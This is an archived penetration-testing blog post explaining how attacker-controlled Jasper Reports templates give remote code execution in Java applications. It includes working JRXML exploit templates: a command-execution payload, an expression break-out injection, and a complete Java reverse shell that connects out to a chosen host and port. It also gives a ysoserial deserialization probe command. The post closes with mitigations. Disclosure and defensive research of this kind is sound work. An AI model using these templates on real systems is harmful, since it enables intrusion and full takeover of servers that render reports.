---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-13_jasper-reports-library-code-injection.md
original_filename: 2023-06-13_jasper-reports-library-code-injection.md
title: Jasper Reports Library Code Injection
category: documents
detected_topics:
- command-injection
- otp
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- otp
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: 54cf5978fbd013f691dd15445286e1e5653b1130ed40a36896392a4d2c198ac6
text_sha256: ab69c49baa7861ba79e75e306504b12fcf259a4f5303faef1919fa666e0e179a
ingested_at: '2026-06-28T07:32:22Z'
sensitivity: unknown
redactions_applied: false
---

# Jasper Reports Library Code Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-13_jasper-reports-library-code-injection.md
- Source Type: markdown
- Detected Topics: command-injection, otp, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:22Z
- Redactions Applied: False
- Raw SHA256: `54cf5978fbd013f691dd15445286e1e5653b1130ed40a36896392a4d2c198ac6`
- Text SHA256: `ab69c49baa7861ba79e75e306504b12fcf259a4f5303faef1919fa666e0e179a`


## Content

---
title: "Jasper Reports Library Code Injection"
page_title: "Jasper Reports Library Code Injection – Insinuator.net"
url: "https://insinuator.net/2023/06/jasper-reports-library-code-injection/"
final_url: "https://insinuator.net/2023/06/jasper-reports-library-code-injection/"
authors: ["Dennis Heinze"]
programs: ["Jasper Reports"]
bugs: ["RCE", "SSTI", "Insecure deserialization", "Security code review"]
publication_date: "2023-06-13"
added_date: "2023-06-25"
source: "pentester.land/writeups.json"
original_index: 1054
---

[ Back ](https://insinuator.net/#post-14229)

[Breaking](https://insinuator.net/category/breaking/)

[June 13, 2023](https://insinuator.net/2023/06/jasper-reports-library-code-injection/) by [Dennis Heinze](https://insinuator.net/author/dheinze/)

# Jasper Reports Library Code Injection

[Dennis Heinze](https://insinuator.net/author/dheinze/ "Dennis Heinze")

During the past year we had several projects where our target application used [Jasper Reports](https://community.jaspersoft.com/) in some way. In a few of the cases we found an API that offered to render a template along with some arguments into a PDF file. This was done with the help of the Jasper Reports Java library. Due to the way the library and the expression mechanism works, this endpoint gave us the possibility to inject Java code and gain remote code execution on the target systems.

In this blog post we want to provide an overview over the Jasper Reports Java library in terms of security especially with regard to expression injection attacks.

**TL;DR;** If you come across an API that lets you freely define a Jasper Report template you very likely have code execution. Or to put it differently: Never let Jasper Report templates be user or attacker controlled.

## What are Jasper Reports?

Jasper Reports is a reporting software that comes in various forms. A [Report Designer GUI](https://community.jaspersoft.com/project/jaspersoft-studio), a [server component](https://community.jaspersoft.com/project/jasperreports-server), and the [Java library](https://community.jaspersoft.com/project/jasperreports-library). There are a few more, but for this post the only relevant component is the Java library.

According to its [website](https://community.jaspersoft.com/project/jasperreports-library), Jasper Reports _“is the world’s most popular open source reporting engine”_. The usage is described as being _“able to use data coming from any kind of data source and produce pixel-perfect documents that can be viewed, printed or exported in a variety of document formats including HTML, PDF, Excel, OpenOffice and Word”_

Templating and reporting engines in general are often prone to (template) injection attacks, so when we first encountered Jasper Reports we were immediately curious.

There is some previous work on Jasper Reports. _Foxglovesecurity_ described in a [blog post](https://foxglovesecurity.com/2016/10/14/hacking-jasperreports-the-hidden-shell-feature/) how to compromise the Jasper Reports server component using _Scriptlets_. There is also a [GitHub gist](https://gist.github.com/v-p-b/dd95c72c6924dc1338e78e9d380bd388) that contains a Jasper Report template JRXML file that leads to Java Code execution. The issue is essentially the same as the one we found during one of our penetration tests. [This blog post](https://depthsecurity.com/blog/exploiting-custom-template-engines) also briefly mentions the issue. The blog post and the Gist are more than four years old, but the issue exists to this day.

Jasper Reports offer a wide variety of features and APIs. In this blog post we’re only going into the parts that are relevant for gaining code execution via template expressions. This is by no means a proper security assessment of the library. Moreover, we really only examined the parts that were relevant for the exploitation, so the features we’re showing are only a very small subset of what Jasper Reports can do.

## Jasper Report Creation

Imagine a REST endpoint, `/render-xml-template`, that accepts a template and optional parameters and returns a rendered PDF file. This involves loading and deserializing the template into a `JasperDesign` object. The format of the template can either be an XML file, typically with the ending `.jrxml`, or a serialized Java object (in form of a `.jasper`) file.

This `JasperDesign` object is then compiled into a `JasperReport` object. Before rendering or exporting it into a target format, it can be filled with parameters. A template can define _named parameters_ that can be references inside the template. The `JasperFillManager` takes the compiled report as well as a dictionary of parameters and fills the report accordingly.

In the end, the `JasperReportManager` can be used to export the filled report to a PDF file.

With a Java Spring endpoint, the whole process may look as follows:
  
  
  @PostMapping(value="/render-xml-template", consumes = MediaType.
  APPLICATION_JSON_VALUE, produces = MediaType.APPLICATION_PDF_VALUE) 
  public ResponseEntity<byte[]> renderXMLTemplate(@RequestBody 
  RenderTemplateRequest req) 
  throws JRException {
  // Decode template from base64
  byte[] templateXMLBytes = Base64.getDecoder().decode(req.getTemplate());
  
  // Load template and compile to report
  JasperDesign design = JRXmlLoader.load(new ByteArrayInputStream(
  templateXMLBytes));
  JasperReport rep = JasperCompileManager.compileReport(design);
  
  // Decode and set the template's parameters
  HashMap<String, Object> new_params = new HashMap<String, Object>(req.
  getParameters());
  JasperPrint print = JasperFillManager.fillReport(rep, new_params, new 
  JREmptyDataSource());
  
  // Export template to PDF
  ByteArrayOutputStream out = new ByteArrayOutputStream();
  JasperExportManager.exportReportToPdfStream(print, out);
  
  HttpHeaders headers = new HttpHeaders();
  headers.setContentType(MediaType.APPLICATION_PDF);
  headers.setContentDispositionFormData("report.pdf", "report.pdf");
  ResponseEntity<byte[]> response = new ResponseEntity<>(out.toByteArray(), 
  headers, HttpStatus.OK);
  
  return response;
  }
  
  

We accept a JSON POST body that contains a base64-encoded Jasper template as well as a dictionary with template parameters. The template is decoded and parsed into the `JasperDesign` object using the `JRXmlLoader.load()` method. Afterwards it is compiled using the `JasperCompileManager`. The provided parameters are then filled in the template using the `JasperFillManager`. Lastly, the PDF output stream is created and returned in the HTTP response.

An example POST request may look as follows:
  
  
  POST /render-xml-template HTTP/1.1
  Content-Type: application/json
  Host: localhost
  
  {
  "parameters": {
  "param1": "something",
  "param2": 123
  },
  "template": "ZHVtbXkgY29udGVudCwgbm90IHhtbCA6KQo="
  }
  

This is a very simplified version of what we have seen during our engagements in the past. If you are ever in such a situation, you’ll likely be able to execute arbitrary code.

To understand why, let’s look closer into what these templates look like.

## Jasper Report Templates

As mentioned before, Jasper Report templates can come in different formats. A more or less human-readable XML version – the JRXML files, or the binary serialized `.jasper` files. The information encoded in these files is pretty much the same. It’s also possible to convert the formats into each other. For purposes of readability, we will focus on XML files here. Functionally and from a point of view of exploitability the two representations are equal in all relevant aspects to the best of our knowledge.

Below is an excerpt of one of the example template files [FirstJasper.jrxml](https://github.com/TIBCOSoftware/jasperreports/blob/master/jasperreports/demo/samples/jasper/reports/FirstJasper.jrxml).
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" ..>
  ...
  <parameter name="ReportTitle" class="java.lang.String"/>
  <parameter name="MaxOrderID" class="java.lang.Integer"/>
  ...
  <variable name="FirstLetter" class="java.lang.String" resetType="None">
  <variableExpression><![CDATA[$F{ShipCountry}.substring(0, 1).toUpperCase()]]></variableExpression>
  </variable>
  ...
  <title>
  <band height="100">
  ...
  <textField isBlankWhenNull="true">
  <reportElement style="Serif_Bold" x="180" y="5" width="375" height="35" uuid="2daee644-131d-47a5-8d4b-4921486e7db0"/>
  <textElement textAlignment="Right">
  <font size="22"/>
  </textElement>
  <textFieldExpression><![CDATA[$P{ReportTitle}]]></textFieldExpression>
  </textField>
  ...
  </jasperReport>
  
  

There are multiple interesting things in this file. Firstly, we can see how the parameters are defined (with the `parameter` tag). Secondly, there are `variable` tags that define variables which are available within the template. The interesting part, however, is the `variableExpression` tag. If we remove all the unnecessary CDATA stuff in line 8, what is left is the expression `$F{ShipCountry}.substring(0, 1).toUpperCase()`. Apart from the curly brackets part, this looks a lot like Java code.

And it is! You can [insert Java expressions](https://community.jaspersoft.com/documentation/tibco-jaspersoft-studio-user-guide/v60/expressions) for dynamic content generation. Aside from that, `$F{}` references _fields_ , `$V{}` references _variables_ , and `$P{}` references _parameters_. The last variant can also be seen in the `textFieldExpression` tag towards the end. What this does is add the content of the variable `ReportTitle` into the text field. It’s also possible to [write expressions in Groovy or JavaScript](https://community.jaspersoft.com/documentation/tibco-jaspersoft-studio-user-guide/v60/concepts-jasperreports), although Java is the default.

These templates also have to follow a certain format which we will not get into. If you ever need to write an exploit, just start off with one of the example templates, or use the POC provided towards the end of the post.

## Jasper Report Expressions

Let’s take a closer look at Jasper Report expressions.

As we have seen before, we can reference things such as variables, fields, or parameters and process them within Java expressions. Jasper processes **expressions** , not **statements** (see [Java expression versus statements](https://stackoverflow.com/questions/39523474/what-is-the-difference-between-an-expression-and-a-statement-in-java)). This basically means that the code we insert needs to _return something_. Jasper Reports defines a list of [data types it can handle](https://community.jaspersoft.com/documentation/tibco-jaspersoft-studio-user-guide/v60/expressions). These include basic types such as strings, integers, or floats. In the example above, we have seen that the `FirstLetter` variable has a class type of `java.lang.String` defined in its `class` attribute. This means that the expression (in the `variableExpression` tag) needs to return a string.

## Simple Code Execution

With the REST endpoint shown above and a simple template we can gain code execution and get a cute little PDF POC like this:

![Jasper Report RCE PoC. Code execution results output to PDF](https://insinuator.net/wp-content/uploads/2023/06/poc_cmd_id_shadow-940x1024.png)

Let’s have a look at the template XML:
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <jasperReport name="FirstJasper" pageWidth="1200" pageHeight="1200" columnWidth="270">
  <style name="Arial_Bold" isDefault="true" fontName="Serif" fontSize="12" />
  
  <parameter name="cmd" class="java.lang.String">
  <defaultValueExpression>"id"</defaultValueExpression>
  </parameter>
  
  <group name="grp">
  <groupExpression><![CDATA[true]]></groupExpression>
  <groupHeader>
  <band height="1100">
  <textField>
  <reportElement height="1000" width="1000"  x="120" y="14" forecolor="#222222" style="Arial_Bold"/>
  <textFieldExpression class="java.lang.String">
  <![CDATA[new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec($P{cmd}).getInputStream())).readLine()]]>
  </textFieldExpression>
  </textField>
  </band>
  </groupHeader>
  </group>
  </jasperReport>
  

The template is as small as I was able to get it. It seems that all these `group` tags are required. The two main parts are the **cmd** parameter and the `reportElement` tag with its `textFieldExpression`. The expression is basically an exec of the value stored in the **cmd** parameter.

`new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec($P{cmd}).getInputStream())).readLine()`

This works because the return value of this expression is also a string. Additionally, we define a default value for the **cmd** parameter: `id`. Therefore, if we do not set the **cmd** parameter in the `fillReport()` method, the default value is used and the `id` command is executed. As we’re specifying a `textField` tag here, the output will be displayed within a text field in the resulting PDF.

Okay, this is great. We can now execute code. But having a real interactive reverse shell would be much cooler. Depending on the target system it might be possible to use something simple like, for example, netcat. During our engagement, we were not that lucky. The system the service ran in had basically no tools available. Therefore, it would be pretty cool to have a payload that works independently of what tools are installed on the target. In the best case, we would just inject a Java-based reverse shell.

But then, there’s the problem that we can only specify Java expressions. No statements. For an interactive reverse shell, we would require at least a loop – which is a statement. I tried to experiment a bit with possible options of how to build a reverse shell within an expression. I wasn’t really successful, but I’m not too deep into Java internals, maybe it’s possible.

Instead, I chose to take a look at how these expressions are actually evaluated and processed within the library and during report creation.

## Jasper Report Expression Evaluation

The way these expressions are evaluated is… interesting. Essentially, they are compiled to a Java class. And the way that this is implemented is by putting together Java code via string concatenation. [It looks a bit weird](https://github.com/TIBCOSoftware/jasperreports/blob/45d613beecf4004ab9f23194d7694d0499f99327/jasperreports/src/net/sf/jasperreports/engine/design/JRClassGenerator.java#L566). Below is a small snippet of the `writeExpression` method in the `JRClassGenerator` class.
  
  
  protected void writeExpression(StringBuilder sb, JRExpression expression, 
  byte evaluationType)
  {
  sb.append("  case "); 
  sb.append(sourceTask.getExpressionId(expression)); 
  sb.append(" : \n");
  sb.append("  {\n");
  sb.append("  value = ");
  sb.append(this.generateExpression(expression, evaluationType));
  sb.append(";");
  appendExpressionComment(sb, expression);
  sb.append("\n");
  sb.append("  break;\n");
  sb.append("  }\n");
  }
  
  

Here we can see that it writes out `value =` plus the result of the `generateExpression()` method. Below is a relevant snippet of the `appendExpressionText()` method that is called by `generateExpression()`. It is the part where the actual parameter gets written.
  
  
  protected void appendExpressionText(JRExpression expression, StringBuilder 
  sb, String chunkText)
  {
  for (StringTokenizer tokenizer = new StringTokenizer(chunkText, "\n", 
  true);
  tokenizer.hasMoreTokens();)
  {
  String token = tokenizer.nextToken();
  if (token.equals("\n"))
  {
  appendExpressionComment(sb, expression);
  }
  sb.append(token);
  }
  }
  

All this does is appending the content of the expression tag with the addition of a comment that is inserted after each line to identify the expression, which looks something like `//$JR_EXPR_ID=12$`

In our case this would result in the string `value = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine(); //$JR_EXPR_ID=12$`

We can also see this in the error output if we put something that leads to a compilation error. If we put garbage in the expression tag, the error message looks as follows:

`DEBUG DispatcherServlet:1101 - Failed to complete request: net.sf.jasperreports.engine.JRException: Errors were encountered when compiling report expressions class file:  
1. akjhfglksjdhfglk cannot be resolved to a variable  
value = akjhfglksjdhfglk; //$JR_EXPR_ID=12$`

Well. This is **literally** string concatenation to generate Java code. And where there’s string concatenation, there’s usually some sort of injection. Especially when there’s no sanitization whatsoever.

So if we break out of this `value = ...` assignment, we can put our own Java code there. In order to do this, we just need to properly end the assignment, put a semicolon, and then we can insert our own code.

We can see that this works if we set the following expression content:

`"string";  
new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec($P{cmd}).getInputStream())).readLine();`

This still works the same ways as before, because the generated code will look something like this:

`value = "string";  
new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();`

This seemed much easier than trying to squeeze a reverse shell into an expression.

## Reverse Shell

The only thing left now is putting a Java-based reverse shell into the template. In addition to that, we put together a template that has both host and IP as parameters. If you have an endpoint that allows setting parameters, this makes it easy to specify the URL and IP for different receiving servers.

The final reverse shell template looks as follows:
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <jasperReport name="FirstJasper" columnCount="2" pageWidth="1200" pageHeight="1200">
  <style name="Arial_Bold" isDefault="false" fontName="Serif" fontSize="12" />
  
  <parameter name="host" class="java.lang.String">
  <defaultValueExpression>"localhost"</defaultValueExpression>
  </parameter>
  <parameter name="port" class="java.lang.Integer">
  <defaultValueExpression>4444</defaultValueExpression>
  </parameter>
  
  <group name="RCEGroup" isStartNewColumn="true" isReprintHeaderOnEachPage="true" minHeightToStartNewPage="200">
  <groupExpression><![CDATA[true]]></groupExpression>
  <groupHeader>
  <band height="1100">
  <textField>
  <reportElement height="1000" width="1000" x="120" y="14" forecolor="#ff0000" style="Arial_Bold"/>
  <textFieldExpression class="java.lang.String"><![CDATA[ "test"; // Escape expression statement (variable assignment)
  String host=$P{host};
  int port=$P{port};
  String cmd="/bin/sh";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
  Socket s=new Socket(host,port);
  InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
  OutputStream po=p.getOutputStream(),so=s.getOutputStream();
  while(!s.isClosed()) {
  while(pi.available()>0)
  so.write(pi.read());
  while(pe.available()>0)
  so.write(pe.read());
  while(si.available()>0)
  po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try {
  p.exitValue();
  break;
  }
  catch (Exception e){
  }
  };
  p.destroy();
  s.close();
  ]]>
  </textFieldExpression>
  </textField><F13>
  </band>
  </groupHeader>
  </group>
  </jasperReport>
  

Throwing this at an API that processes the template will result in a reverse shell. If parameters cannot be specified in the API, it will try to connect to `localhost:4444`. Otherwise, the host and port can be specified in the _host_ and _port_ parameters. To catch the reverse shell, just start a netcat listener on the given port.

## Bonus: Insecure Deserialization

As mentioned before, the binary `.jasper` format is essentially a serialized Java object representing the template. When a template is given in binary format, the file is deserialized and the deserialized objects are then processed.

The deserialization is implemented in the `JRLoader` class. However, it does not do much more than calling `ObjectInputStream.readObject()`. Most of the methods just return `Object`, for example [this `loadObject()` method](https://github.com/TIBCOSoftware/jasperreports/blob/master/jasperreports/src/net/sf/jasperreports/engine/util/JRLoader.java#LL173C3-L173C3). So it is essentially a generic deserialization interface. This makes the library prone to [insecure deserialization](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization).
  
  
  public static Object loadObject(JasperReportsContext jasperReportsContext, 
  URL url) throws JRException
  {
  Object obj = null;
  
  try (
  InputStream is = url.openStream();
  ObjectInputStream ois = new ContextClassLoaderObjectInputStream(
  jasperReportsContext, is)
  )
  {
  obj = ois.readObject();
  }
  [...]
  
  

Depending on what classes are available in the application’s class path, this could, in the worst case, also lead to code execution. We briefly checked the Jasper Reports library code base itself but didn’t find any useful [deserialization gadgets](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization) at first glance.

A good way to confirm insecure deserializations and create a quick proof of concept is to use [ysoserial](https://github.com/frohoff/ysoserial/)’s “URLDNS” payload. It doesn’t do anything interesting other than sending a DNS request with a controlled hostname to resolve. But you can use it to confirm that you can make the application deserialize arbitrary objects. The upside is that it is almost always available.

In our REST endpoint example above, you could use the following command to create a URLDNS deserialization payload:

`java -jar ysoserial-all.jar URLDNS "http://SUBDOMAIN.YOUR.DOMAIN.com" | base64`

An easy way to catch this DNS request is by using [Burpsuite’s Collaborator](https://portswigger.net/burp/documentation/collaborator).

To protect against any potential deserialization issues, Jasper could implement [ObjectInputFilter](https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.html)s in their `JRLoader` class. They could, for example, only allows classes in the `net.sf.jasperreports` namespace to be deserialized. Still, it should be noted that given that the structure of report designs and templates is very complex, it might be difficult to define an allow list for deserialization.

The dangers of this deserialization issue really depend on what other classes are available in the application that uses the Jasper Report library. But this is another reason to be careful when using user-controlled Jasper Report templates.

## Conclusion

So what now?

Well, firstly, never let a user of your application or API freely define Jasper Report templates. After looking through the documentation I found no way to disable expressions. This means that control over templates will very likely give you code execution in any case.

The best mitigation, from an application perspective, is to have a reviewed or fixed set of Report templates that are used in the context of the application. The user will only have the choice between these predefined templates. For many applications this is likely the default approach anyway.

However, sometimes that is not possible. In these cases, an abstraction layer over the actual template format can be created. This would allow a user to modify only specific parts of the template, for example, via predefined template building blocks. Critical parts, i.e., the ones that will end up in an expression must be filtered and sanitized very strictly. The filter should restrict the length and filter out at least semicolons and, depending on the use-case, braces and parentheses.

It is debatable whether this should be considered a vulnerability. The expression evaluation is a _feature_ of the report creation process. It enables users to create dynamic report content. From the perspective of the library, the responsibility is likely transferred to the users. However, then it should be possible to disable or restrict the expression feature. Additionally, there should be a warning that the possibility to define expressions leads to arbitrary code execution. Developers using the library should be aware of the consequences when using report templates.

– Dennis

# TROOPERS 2023

If you’re hungry for more knowledge and more talks of cybersecurity experts, you’ll want to mark your calendar for the upcoming TROOPERS23 conference. TROOPERS23 will be held from June 26, to June 30, 2023. As always, we will offer you a high-quality selection of trainings and talks given by IT security practitioners from all over the world. TROOPERS is known for bringing together experts from around the world to share their experiences and knowledge, making it a great opportunity to network with peers in the industry.

Get your Ticket: <https://troopers.de/>

[Dennis Heinze](https://insinuator.net/author/dheinze/ "Dennis Heinze")

[ Back ](https://insinuator.net/#post-14229)

[exploit](https://insinuator.net/tag/exploit/)[injection](https://insinuator.net/tag/injection/)[Java](https://insinuator.net/tag/java/)
